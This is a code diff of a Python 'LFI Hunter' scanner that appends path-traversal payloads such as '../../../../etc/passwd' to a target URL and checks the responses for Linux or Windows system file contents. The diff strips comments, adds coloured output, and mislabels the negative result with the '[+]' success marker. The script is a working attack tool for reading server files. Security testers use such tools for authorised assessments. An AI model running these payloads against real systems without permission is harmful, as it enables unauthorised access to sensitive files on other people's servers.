@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 import requests
 import sys
+from termcolor import colored
 
-# Expanded LFI test patterns with more path traversal variations
 test_payloads = [
     # Linux payloads
     '../../../../../../../../etc/passwd',
@@ -28,53 +28,45 @@ test_payloads = [
 ]
 
 def test_lfi(url):
-    """
-    Test a URL for Local File Inclusion vulnerability
-    """
     print(f"\nTesting URL: {url}")
     found_vulnerabilities = []
     
-    # Try each payload one by one
     for payload in test_payloads:
         try:
-            # Add the payload to the URL
             test_url = url + payload
             
-            # Send the request
             response = requests.get(test_url, timeout=5)
             
-            # Check for Linux files
             if "root:x:" in response.text:
                 found_vulnerabilities.append(("Linux", payload))
             
-            # Check for Windows files
             elif "[boot loader]" in response.text:
                 found_vulnerabilities.append(("Windows", payload))
                 
         except Exception as e:
             continue
     
-    # Print results only if vulnerabilities found
+
     if found_vulnerabilities:
-        print("\n[+] LFI Vulnerabilities Found:")
+        print(colored("\n[+] LFI Vulnerabilities Found:","green"))
         for system, payload in found_vulnerabilities:
-            print(f"  {system} vulnerability with payload: {payload}")
+            print(colored(f"  {system} vulnerability with payload: {payload}","green"))
         return True
     else:
-        print("\n[-] No LFI vulnerabilities found")
+        print(colored("\n[+] No LFI Vulnerabilities Found","green"))
         return False
 
 def main():
-    print("LFI Hunter ")
-    print("=" * 30)
+    print(colored("\tLFI Hunter","red"))
+    print(colored("="*30,"red"))
     
-    # Check if URL was provided
+    
     if len(sys.argv) < 2:
-        print("\nUsage: python lfi_detector.py <URL>")
-        print("Example: python lfi_detector.py http://example.com/page.php")
+        print("\nUsage: python lfihunter.py <URL>")
+        print('Example: python lfihunter.py "http://example.com/filename="')
         sys.exit()
     
-    # Get the URL from command line
+    
     url = sys.argv[1]
     
     # Make sure URL starts with http:// or https://
